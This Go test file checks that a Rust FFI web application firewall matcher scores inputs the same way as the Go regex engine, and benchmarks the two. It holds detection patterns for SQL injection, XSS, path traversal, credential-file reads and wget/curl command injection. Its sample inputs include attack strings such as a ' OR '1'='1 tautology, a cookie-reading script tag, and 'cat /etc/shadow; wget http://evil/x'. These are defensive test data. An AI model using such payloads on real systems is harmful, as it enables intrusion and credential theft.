//go:build windows

package rustffi

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"
)

// resolveDLL walks up from cwd to find the built Rust cdylib and points
// WAFMATCHER_DLL at it so the FFI loads during `go test`.
func resolveDLL() {
	if os.Getenv("WAFMATCHER_DLL") != "" {
		return
	}
	dir, _ := os.Getwd()
	for i := 0; i < 8; i++ {
		cand := filepath.Join(dir, "rust", "wafmatcher", "target", "release", "wafmatcher.dll")
		if _, err := os.Stat(cand); err == nil {
			os.Setenv("WAFMATCHER_DLL", cand)
			return
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return
		}
		dir = parent
	}
}

func TestMain(m *testing.M) {
	resolveDLL()
	os.Exit(m.Run())
}

// representative subset of the Go engine's builtin rules (patterns already
// carry the (?i) flag, identical to what Rust compiles).
var (
	benchPatterns = []string{
		`(?i)(\bSELECT\b.{0,40}\bFROM\b|\bUNION\b.{0,40}\bSELECT\b|\bINSERT\b.{0,40}\bINTO\b)`,
		`(?i)('|")\s*(OR|AND)\s*('|")\s*(=|LIKE)`,
		`(?i)admin'\s*--\s*|1'\s*OR\s*'1'\s*=\s*'1`,
		`(?i)<script[\s>]`,
		`(?i)javascript\s*:`,
		`(?i)onerror\s*=|onload\s*=|onclick\s*=`,
		`(?i)<iframe[\s>]|<embed[\s>]|<object[\s>]`,
		`(?i)\.\./\.\./|\.\.\\\.\.\\|%2e%2e%2f`,
		`(?i)/etc/passwd|/etc/shadow|/etc/hosts`,
		`(?i)[|;&$` + "`" + `]\s*(?:id|whoami|pwd|ls|cat|rm|wget|curl)\b`,
	}
	benchScores = []int32{50, 45, 50, 50, 40, 40, 45, 45, 50, 50}
)

var benchInputs = []string{
	"GET /index.html HTTP/1.1",
	"q=1' OR '1'='1",
	"<script>alert(document.cookie)</script>",
	"../../../../etc/passwd",
	"cat /etc/shadow; wget http://evil/x",
	"SELECT * FROM users WHERE id=1",
	"normal search query about cats",
	"POST /login username=admin&pw=secret",
}

func goScore(patterns []string, scores []int32, input string) int {
	total := 0
	for i, p := range patterns {
		re := regexp.MustCompile(p)
		if re.MatchString(input) {
			total += int(scores[i])
		}
	}
	return total
}

func TestParityWithGo(t *testing.T) {
	if !Available() {
		t.Skip("wafmatcher.dll not available")
	}
	m, err := New(benchPatterns, benchScores)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	defer m.Close()
	for _, in := range benchInputs {
		got := m.Score(in)
		want := goScore(benchPatterns, benchScores, in)
		if got != want {
			t.Errorf("input %q: rust=%d go=%d", in, got, want)
		}
	}
}

func BenchmarkRustWAF(b *testing.B) {
	if !Available() {
		b.Skip("wafmatcher.dll not available")
	}
	m, err := New(benchPatterns, benchScores)
	if err != nil {
		b.Fatal(err)
	}
	defer m.Close()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = m.Score(benchInputs[i%len(benchInputs)])
	}
}

func BenchmarkGoWAF(b *testing.B) {
	compiled := make([]*regexp.Regexp, len(benchPatterns))
	for i, p := range benchPatterns {
		compiled[i] = regexp.MustCompile(p)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		in := benchInputs[i%len(benchInputs)]
		total := 0
		for j, re := range compiled {
			if re.MatchString(in) {
				total += int(benchScores[j])
			}
		}
		_ = total
	}
}
